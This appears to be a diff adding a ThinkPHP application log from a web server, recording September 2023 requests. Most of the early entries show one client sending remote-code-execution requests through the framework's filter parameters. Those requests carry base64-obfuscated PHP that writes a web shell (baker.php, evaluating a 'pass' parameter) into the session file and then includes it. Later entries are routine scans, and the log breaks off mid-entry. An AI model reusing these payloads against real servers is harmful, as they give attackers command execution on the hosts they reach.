@@ -1,0 +1,1724 @@
+---------------------------------------------------------------
+[ 2023-09-08T00:01:47+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.045273s] [吞吐率：22.09req/s] [内存消耗：2,677.72kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000032s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002416s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000929s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000041s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '408',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 
+  array (
+    0 => 'think\\Session::set',
+  ),
+  'method' => 'get',
+  'get' => 
+  array (
+    0 => '<?php $a=\'file_put_contents\';$b=\'base64_decode\';$a($b(\'YmFrZXIucGhw\'),$b(\'PD9waHAgY2xhc3MgR2NFNDkzRjYgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEh5NUY3KXsgQGV2YWwoIi8qWkJjNjQ2OVYxOCovIi4kSHk1RjcuIiIpOyB9fW5ldyBHY0U0OTNGNigkX1JFUVVFU1RbJ3Bhc3MnXSk7ZWNobyBlcnJvcjMwMz8+\'));?>',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:47+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.044776s] [吞吐率：22.33req/s] [内存消耗：2,676.76kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002461s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000941s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000041s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:48+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.046213s] [吞吐率：21.64req/s] [内存消耗：2,676.76kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000038s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002620s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000938s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000054s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:48+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.043061s] [吞吐率：23.22req/s] [内存消耗：2,678.04kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000048s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002720s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000961s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000038s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '450',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 
+  array (
+    0 => 'think\\Session::set',
+  ),
+  'method' => 'get',
+  'get' => 
+  array (
+    0 => '<?php $a=\'assert\';$b=\'base64_decode\';$a($b(\'ZmlsZV9wdXRfY29udGVudHMoJ2Jha2VyLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdZMnhoYzNNZ1IyTkZORGt6UmpZZ2V5QndkV0pzYVdNZ1puVnVZM1JwYjI0Z1gxOWpiMjV6ZEhKMVkzUW9KRWg1TlVZM0tYc2dRR1YyWVd3b0lpOHFXa0pqTmpRMk9WWXhPQ292SWk0a1NIazFSamN1SWlJcE95QjlmVzVsZHlCSFkwVTBPVE5HTmlna1gxSkZVVlZGVTFSYkozQmhjM01uWFNrN1pXTm9ieUJsY25KdmNqTXdNejgrJykpOw==\'));?>',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:49+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.045088s] [吞吐率：22.18req/s] [内存消耗：2,676.76kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000039s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002832s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000970s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000040s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:49+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php?s=captcha
+[运行时间：0.045152s] [吞吐率：22.15req/s] [内存消耗：2,676.76kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002614s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000987s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000040s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'captcha',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:50+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php/index
+[运行时间：0.060590s] [吞吐率：16.50req/s] [内存消耗：3,545.59kb] [文件加载：87]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000035s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002556s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001015s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000034s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '408',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  '_method' => '__construct',
+  'filter' => 
+  array (
+    0 => 'think\\Session::set',
+  ),
+  'method' => 'get',
+  'get' => 
+  array (
+    0 => '<?php $a=\'file_put_contents\';$b=\'base64_decode\';$a($b(\'YmFrZXIucGhw\'),$b(\'PD9waHAgY2xhc3MgR2NFNDkzRjYgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEh5NUY3KXsgQGV2YWwoIi8qWkJjNjQ2OVYxOCovIi4kSHk1RjcuIiIpOyB9fW5ldyBHY0U0OTNGNigkX1JFUVVFU1RbJ3Bhc3MnXSk7ZWNobyBlcnJvcjMwMz8+\'));?>',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002243s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000211s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:50+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php/index
+[运行时间：0.059679s] [吞吐率：16.76req/s] [内存消耗：3,544.18kb] [文件加载：87]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002507s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001040s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000044s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  '_method' => '__construct',
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002361s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000197s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:51+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php/index
+[运行时间：0.060783s] [吞吐率：16.45req/s] [内存消耗：3,544.18kb] [文件加载：87]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002681s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000919s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000048s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  '_method' => '__construct',
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002393s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000259s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:51+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php/index
+[运行时间：0.062027s] [吞吐率：16.12req/s] [内存消耗：3,545.65kb] [文件加载：87]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000037s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002870s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001013s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000036s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '450',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  '_method' => '__construct',
+  'filter' => 
+  array (
+    0 => 'think\\Session::set',
+  ),
+  'method' => 'get',
+  'get' => 
+  array (
+    0 => '<?php $a=\'assert\';$b=\'base64_decode\';$a($b(\'ZmlsZV9wdXRfY29udGVudHMoJ2Jha2VyLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdZMnhoYzNNZ1IyTkZORGt6UmpZZ2V5QndkV0pzYVdNZ1puVnVZM1JwYjI0Z1gxOWpiMjV6ZEhKMVkzUW9KRWg1TlVZM0tYc2dRR1YyWVd3b0lpOHFXa0pqTmpRMk9WWXhPQ292SWk0a1NIazFSamN1SWlJcE95QjlmVzVsZHlCSFkwVTBPVE5HTmlna1gxSkZVVlZGVTFSYkozQmhjM01uWFNrN1pXTm9ieUJsY25KdmNqTXdNejgrJykpOw==\'));?>',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002341s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000207s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T00:01:52+08:00 ] 119.28.45.213 POST 123.206.57.217/index.php/index
+[运行时间：0.061727s] [吞吐率：16.20req/s] [内存消耗：3,544.18kb] [文件加载：87]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002494s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000931s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000035s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '113',
+  'cookie' => 'PHPSESSID=QSSYED5ZT9YDWDF7KHC3JD2T1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv,2.0.1) Gecko/20100101 Firefox/4.0.1',
+  'accept' => '*/*',
+  'host' => '123.206.57.217',
+)
+[ info ] [ PARAM ] array (
+  '_method' => '__construct',
+  'method' => 'GET',
+  'filter' => 
+  array (
+    0 => 'think\\__include_file',
+  ),
+  'get' => 
+  array (
+    0 => '/tmp/sess_QSSYED5ZT9YDWDF7KHC3JD2T1',
+  ),
+  'server' => 
+  array (
+    0 => '1',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002283s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000219s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T07:34:11+08:00 ] 180.101.244.16 GET 001.shanxi0357.cn:8888/UEPs
+[运行时间：0.043370s] [吞吐率：23.06req/s] [内存消耗：2,677.64kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000032s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002581s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001062s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000040s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'UEPs',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+  'host' => '001.shanxi0357.cn:8888',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T07:48:51+08:00 ] 58.218.66.133 GET kyfw.12306.cn/otn/login/checkUser
+[运行时间：0.044961s] [吞吐率：22.24req/s] [内存消耗：2,672.73kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000042s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002719s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000962s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000039s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'otn',
+    1 => 'login',
+    2 => 'checkUser',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'okhttp/3.12.1',
+  'accept' => '*/*',
+  'host' => 'kyfw.12306.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T08:33:52+08:00 ] 106.3.132.184 GET 123.206.57.217/
+[运行时间：0.059569s] [吞吐率：16.79req/s] [内存消耗：3,545.39kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000032s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002317s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000925s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000031s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => '',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002458s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000227s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T08:33:55+08:00 ] 106.3.132.184 GET 123.206.57.217/favicon.ico
+[运行时间：0.044324s] [吞吐率：22.56req/s] [内存消耗：2,677.43kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000047s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002445s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000900s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000039s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => '',
